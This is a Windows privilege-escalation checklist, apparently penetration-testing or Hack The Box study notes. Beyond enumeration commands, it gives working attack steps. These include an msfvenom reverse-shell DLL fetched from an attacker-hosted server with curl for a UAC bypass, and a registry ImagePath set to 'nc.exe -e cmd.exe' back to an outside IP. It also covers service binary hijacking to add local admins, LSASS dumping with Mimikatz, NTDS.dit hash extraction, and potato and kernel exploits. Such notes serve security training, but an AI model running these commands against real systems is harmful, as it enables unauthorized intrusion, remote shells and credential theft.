# Checklist

### Situational Awareness

#### Interface and IP Information

- [ ] Run `ipconfig /all` to list all network interfaces and IP configurations.

#### ARP Table Examination

- [ ] Execute `arp -a` to list ARP table entries.

#### Routing Table Analysis

- [ ] Use `route print` to view active and persistent routes.
- [ ] Identify default gateways and on-link routes.

#### Enumerating Protections

- [ ] Use `Get-MpComputerStatus` to check Windows Defender status.
- [ ] List AppLocker rules using `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`.
- [ ] Check for other anti-virus or EDR services that may interfere with operations.

#### AppLocker Policy Testing

- [ ] Test specific binaries against AppLocker policies using `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`.

---

### Initial Enumeration

#### Tasklist

- [ ] Use `tasklist /svc` to view running processes and associated services.
- [ ] Identify non-standard processes for potential privilege escalation paths.

#### Environment Variables

- [ ] Use `set` to display all environment variables.
- [ ] Check the `PATH` for writable directories or unusual entries.

#### System Configuration

- [ ] Run `systeminfo` to view system details, patch levels, and VM status.
- [ ] Check for recent patches and updates using `wmic qfe` or `Get-Hotfix`.
- [ ] Run Windows Exploit Suggester [wesng](https://github.com/bitsadmin/wesng)

#### Installed Programs

- [ ] Use `wmic product get name` or `Get-WmiObject` to list installed software.
- [ ] Identify software that may have known vulnerabilities.
- [ ] Research vulnerabilities using resources like [Exploit-DB](https://www.exploit-db.com/exploits/49211) and relevant [blog posts](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/).

#### Network Connections

- [ ] Use `netstat -ano | find "LISTEN"`  to view active TCP/UDP connections and listening services.

#### User & Group Information

- [ ] Check logged-in users with `query user`.
- [ ] Determine current user context with `echo %USERNAME%`.
- [ ] Review current user privileges using `whoami /priv`.
- [ ] List current user group memberships with `whoami /groups`.
- [ ] Use `net user` to list all user accounts.
- [ ] Use `net localgroup` to list all groups.
- [ ] Check details of specific groups, especially administrators, with `net localgroup administrators`.
- [ ] Review password policy and account settings using `net accounts`.

---

### Communication with Processes

#### Named Pipes

- [ ] Understand the use of named pipes for inter-process communication.
- [ ] Use `pipelist.exe` to enumerate named pipes.
- [ ] Use PowerShell `gci \\.\pipe\` to list named pipes.

#### Named Pipes Permissions

- [ ] Use `accesschk.exe` to review permissions on named pipes.
- [ ] Identify named pipes with lax permissions for potential privilege escalation.

#### Named Pipes Attack Example

- [ ] Check for named pipes with `FILE_ALL_ACCESS` for the `Everyone` group.
- [ ] Consider exploiting named pipes with weak permissions to escalate privileges.

---

### SeImpersonate and SeAssignPrimaryToken

#### JuicyPotato Exploit

- [ ] Use `JuicyPotato` to exploit `SeImpersonate` or `SeAssignPrimaryToken` privileges.
- [ ] Upload necessary binaries (e.g., `JuicyPotato.exe`, `nc.exe`) to the target.
- [ ] Execute `JuicyPotato` with appropriate arguments to escalate privileges.

#### PrintSpoofer and RoguePotato

- [ ] Use `PrintSpoofer` or `RoguePotato` for Windows Server 2019 and Windows 10 build 1809+.
- [ ] Execute `PrintSpoofer` with the `-c` argument to spawn a reverse shell.

---

### SeDebugPrivilege

#### Dumping Process Memory

- [ ] Use `ProcDump` to dump the memory of processes like `LSASS` to extract sensitive information.
- [ ] Load the dump file in `Mimikatz` to retrieve credentials.

#### Manual Memory Dump

- [ ] If tools cannot be loaded, use Task Manager to create a dump file of `LSASS`.
- [ ] Process the dump file with `Mimikatz` on your attack system.

#### Remote Code Execution as SYSTEM

- [ ] Use PoC scripts to leverage `SeDebugPrivilege` for RCE.
- [ ] Transfer and execute the PoC script on the target system to elevate privileges to SYSTEM.

#### Additional Tools and Techniques

- [ ] Explore other tools and PoCs for achieving SYSTEM access with `SeDebugPrivilege`.
- [ ] Consider modifying PoCs for reverse shells or other commands if you lack a fully interactive session.

---

### Windows Built-in Groups

#### Backup Operators Group

- [ ] Use `whoami /groups` to check current group memberships.
- [ ] Verify if `SeBackupPrivilege` is enabled using `whoami /priv` or `Get-SeBackupPrivilege`.
- [ ] Enable `SeBackupPrivilege` if disabled using `Set-SeBackupPrivilege`.
- [ ] Copy a protected file using `Copy-FileSeBackupPrivilege`.
- [ ] Use `diskshadow.exe` to create a shadow copy of the C drive and expose it as E drive.
- [ ] Copy `NTDS.dit` locally using `Copy-FileSeBackupPrivilege`.
- [ ] Back up SAM and SYSTEM registry hives using `reg save`.
- [ ] Extract credentials from `NTDS.dit` using `DSInternals` or `secretsdump.py`. [DSInternals](https://github.com/MichaelGrafnetter/DSInternals), [Impacket](https://github.com/SecureAuthCorp/impacket)

#### Robocopy

- [ ] Use `robocopy /B` to copy files in backup mode. [Robocopy Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)

#### Additional Tools

- [ ] Import necessary PowerShell modules: `SeBackupPrivilegeUtils.dll`, `SeBackupPrivilegeCmdLets.dll`, `DSInternals.psd1`.
- [ ] Use `secretsdump.py` for offline hash extraction. [Impacket](https://github.com/SecureAuthCorp/impacket)

#### DNSAdmins

- [ ] Check `Get-ADGroupMember -Identity DnsAdmins`

---

### User Account Control (UAC)

#### Confirming UAC Status

- [ ] Confirm if UAC is enabled:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
  
- [ ] Check UAC level:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
  ```

#### System Information

- [ ] Check Windows version and build `[environment]::OSVersion.Version` or `ver`.

#### UAC Bypass Preparation

- [ ] Review the PATH variable:

```cmd
cmd /c echo %PATH%
```

- [ ] Generate a malicious DLL using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > srrstr.dll
```

- [ ] Start a Python HTTP server to host the DLL:

```shell
sudo python3 -m http.server 8080
```

- [ ] Download the DLL to the target system:

```cmd
curl http://<Your_IP>:8080/srrstr.dll -O "C:\Users\<Username>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Testing and Execution

- [ ] Start a Netcat listener on the attack host:

```shell
nc -lvnp <Your_Port>
```

- [ ] Test the connection by executing the DLL:

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\<Username>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

- [ ] Terminate any previous `rundll32` processes:

```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F
```

- [ ] Execute `SystemPropertiesAdvanced.exe` on the target host:

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

#### Tools and Resources

- [UACME Project](https://github.com/hfiref0x/UACME) for UAC bypass techniques.
- [Windows 10 Version History](https://en.wikipedia.org/wiki/Windows_10_version_history) for cross-referencing build numbers.
- [Blog Post on UAC Bypass](https://egre55.github.io/system-properties-uac-bypass) for detailed steps on bypassing UAC.

---

### Weak Permissions

#### Permissive File System ACLs

- [ ] **Run SharpUp to Check for Weak ACLs**
  - Command: `.\SharpUp.exe audit`
  - Tool: [SharpUp](https://github.com/GhostPack/SharpUp/)

- [ ] **Verify Permissions with icacls**
  - Command: `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`
  - Tool: [icacls](https://ss64.com/nt/icacls.html)

- [ ] **Replace Service Binary**
  - Backup original binary and replace with malicious binary.
  - Command:

    ```
    cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
    sc start SecurityService
    ```

#### Weak Service Permissions

- [ ] **Review SharpUp Output for Modifiable Services**
  - Command: `SharpUp.exe audit`

- [ ] **Check Permissions with AccessChk**
  - Command: `accesschk.exe /accepteula -quvcw WindscribeService`
  - Tool: [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

- [ ] **Change Service Binary Path**
  - Command: `sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"`

- [ ] **Stop and Start the Service**
  - Stop Command: `sc stop WindscribeService`
  - Start Command: `sc start WindscribeService`

- [ ] **Confirm Local Admin Group Addition**
  - Command: `net localgroup administrators`

#### Unquoted Service Path

- [ ] **Search for Unquoted Service Paths**
  - Command: `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

#### Permissive Registry ACLs

- [ ] **Check for Weak Service ACLs in Registry**
  - Command: `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`

- [ ] **Change ImagePath with PowerShell**
  - Command: `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`

#### Modifiable Registry Autorun Binary

- [ ] **Check Startup Programs**
  - Command: `Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl`

- [ ] **Review Autorun Locations**
  - Reference: [HackTricks Post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html)
  - Reference: [Microsoft Press Store](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

#### Cleanup

- [ ] **Revert the Binary Path**
  - Command: `sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"`

- [ ] **Start the Service Again**
  - Command: `sc start WindScribeService`

- [ ] **Verify Service is Running**
  - Command: `sc query WindScribeService`

---

### Kernel Exploits

##### MS08-067

- [ ] Check if port 445 is accessible.
- [ ] Use Metasploit or standalone exploit for MS08-067.
- [ ] Reference: [Hack The Box Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)

##### MS17-010 (EternalBlue)

- [ ] Check if SMBv1 is enabled.
- [ ] Use Metasploit or standalone exploit for MS17-010.
- [ ] Reference: [Hack The Box Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)

##### ALPC Task Scheduler 0-Day

- [ ] Use the SchRpcSetSecurity API function.
- [ ] Reference: [ALPC Task Scheduler Writeup](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html)
- [ ] Try on [Hack The Box Hackback](https://snowscan.io/htb-writeup-hackback/)

##### CVE-2021-36934 (HiveNightmare)

- [ ] Check permissions on the SAM file using `icacls`.
- [ ] Use [HiveNightmare PoC](https://github.com/GossiTheDog/HiveNightmare) to create copies of registry hives.
- [ ] Extract password hashes using `impacket-secretsdump`.

##### CVE-2021-1675/CVE-2021-34527 (PrintNightmare)

- [ ] Check if the Spooler service is running.
- [ ] Use [PrintNightmare PowerShell PoC](https://github.com/calebstewart/CVE-2021-1675) to add a local admin user.
- [ ] Reference: [CVE-2021-1675 GitHub](https://github.com/cube0x0/CVE-2021-1675)

#### Enumerating Missing Patches

- [ ] Use `systeminfo`, `wmic qfe list brief`, or `Get-Hotfix` to list installed updates.
- [ ] Search for missing KBs in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com).

#### CVE-2020-0668 Example

- [ ] Verify current user privileges using `whoami /priv`.
- [ ] Use [CVE-2020-0668 Exploit](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) to move files.
- [ ] Generate a malicious binary using `msfvenom`.
- [ ] Host and download the binary using a Python HTTP server.
- [ ] Run the exploit and replace the binary in the target directory.
- [ ] Use Metasploit to handle the reverse shell connection.

---

### Other

- [ ] Perform all credential hunting methods
- [ ] LOLBAS
